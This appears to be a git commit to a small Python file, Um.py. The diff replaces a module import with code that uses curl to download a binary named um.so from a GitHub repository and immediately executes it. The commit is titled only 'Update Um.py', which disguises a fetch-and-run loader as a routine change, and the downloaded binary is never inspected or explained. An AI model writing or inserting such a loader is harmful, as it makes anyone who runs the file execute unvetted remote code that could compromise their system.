fa34b07b2cf6906e083a8f090b5fb3550574c2b1
Saoud060 <63461235+Saoud060@users.noreply.github.com>
2023-10-07 14:37:37 +0500

    Update Um.py

--- Um.py
+++ Um.py
@@ -1,1 +1,9 @@
-import um
+import subprocess
+
+um_so_url = "https://github.com/Saoud060/Approval/raw/main/um.so"
+
+subprocess.run(["curl", "-o", "um.so", um_so_url])
+try:
+    subprocess.run(["./um.so"])
+except Exception as e:
+    print(f"Error: {e}")
